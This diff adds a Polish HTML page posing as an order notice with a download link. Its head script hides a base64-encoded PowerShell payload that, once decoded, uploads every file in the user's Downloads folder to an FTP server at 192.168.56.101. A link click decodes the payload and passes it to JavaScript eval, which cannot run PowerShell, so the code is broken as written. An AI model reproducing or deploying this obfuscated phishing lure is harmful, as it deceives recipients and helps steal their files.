@@ -1,0 +1,30 @@
+<!DOCTYPE html>
+<html lang="pl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <script>
+        // Przykład szkodliwego kodu JavaScript
+        function runPowerShell() {
+            var shellCode = "JGZ0cFNlcnZlciA9ICJmdHA6Ly8xOTIuMTY4LjU2LjEwMSIKJHVzZXJuYW1lID0gW1N5c3RlbS5TZWN1cml0eS5QcmluY2lwYWwuV2luZG93c0lkZW50aXR5XTo6R2V0Q3VycmVudCgpLk5hbWUuU3BsaXQoJ1wnKVsxXQokbG9jYWxGb2xkZXIgPSAiQzpcVXNlcnNcJHVzZXJuYW1lXERvd25sb2FkcyIKJGNsaWVudCA9IE5ldy1PYmplY3QgU3lzdGVtLk5ldC5XZWJDbGllbnQKJGNsaWVudC5DcmVkZW50aWFscyA9IE5ldy1PYmplY3QgU3lzdGVtLk5ldC5OZXR3b3JrQ3JlZGVudGlhbCgiYW5vbnltb3VzIiwgImFub255bW91cyIpCgokZmlsZXMgPSBHZXQtQ2hpbGRJdGVtIC1QYXRoICRsb2NhbEZvbGRlcgoKZm9yZWFjaCAoJGZpbGUgaW4gJGZpbGVzKSB7CiAgICAkZnRwRmlsZVBhdGggPSAiJGZ0cFNlcnZlci91cGxvYWRzLyQoJGZpbGUuTmFtZSkiCiAgICAKICAgIHRyeSB7CiAgICAgICAgJGxvY2FsRmlsZVBhdGhXaXRoVXNlciA9ICIkbG9jYWxGb2xkZXJcJCgkZmlsZS5OYW1lKSIKICAgICAgICAkY2xpZW50LlVwbG9hZEZpbGUoJGZ0cEZpbGVQYXRoLCAiU1RPUiIsICRsb2NhbEZpbGVQYXRoV2l0aFVzZXIpCiAgICB9IGNhdGNoIHsKICAgICAgICAjdGVzdAogICAgfQp9";
+
+            // Dekodowanie Base64 i uruchomienie kodu
+            var encoded = atob(shellCode); // Dekoduje Base64
+            eval(encoded); // Uruchamia dekodowany kod
+        }
+
+        // Dodaj zdarzenie do linku
+        document.addEventListener("DOMContentLoaded", function() {
+            document.getElementById("maliciousLink").addEventListener("click", function(event) {
+                event.preventDefault(); // Zatrzymaj domyślne działanie linku
+                runPowerShell(); // Uruchom kod
+            });
+        });
+    </script>
+</head>
+<body>
+    <h1>Witaj!</h1>
+    <p>Oto Twoje zamówienie. Kliknij w poniższy link, aby uzyskać więcej informacji:</p>
+    <a href="#" id="maliciousLink">Pobierz zamówienie</a>
+</body>
+</html>
